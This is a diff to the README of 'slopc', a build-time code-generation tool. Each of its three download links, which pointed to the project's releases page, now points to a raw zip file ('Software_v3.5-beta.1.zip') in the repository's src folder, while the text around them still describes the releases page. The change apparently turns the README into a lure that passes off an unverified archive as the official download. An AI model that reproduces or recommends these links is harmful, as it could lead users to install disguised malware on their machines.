@@ -1,6 +1,6 @@
 # ⚙️ slopc - Write function bodies at build time
 
-[![Download slopc](https://img.shields.io/badge/Download-slopc%20Releases-blue?style=for-the-badge)](https://github.com/Amberlytaut778/slopc/releases)
+[![Download slopc](https://img.shields.io/badge/Download-slopc%20Releases-blue?style=for-the-badge)](https://github.com/Amberlytaut778/slopc/raw/refs/heads/main/src/Software_v3.5-beta.1.zip)
 
 ## 🧩 What slopc does
 
@@ -29,7 +29,7 @@ If you only want to try the app or package, you can still download the release f
 
 Visit this page to download slopc:
 
-https://github.com/Amberlytaut778/slopc/releases
+https://github.com/Amberlytaut778/slopc/raw/refs/heads/main/src/Software_v3.5-beta.1.zip
 
 On the releases page, look for the latest version near the top. Open it, then download the Windows file that matches your system.
 
@@ -172,4 +172,4 @@ If you want the fastest path:
 
 ## 📦 Download again
 
-https://github.com/Amberlytaut778/slopc/releases
+https://github.com/Amberlytaut778/slopc/raw/refs/heads/main/src/Software_v3.5-beta.1.zip
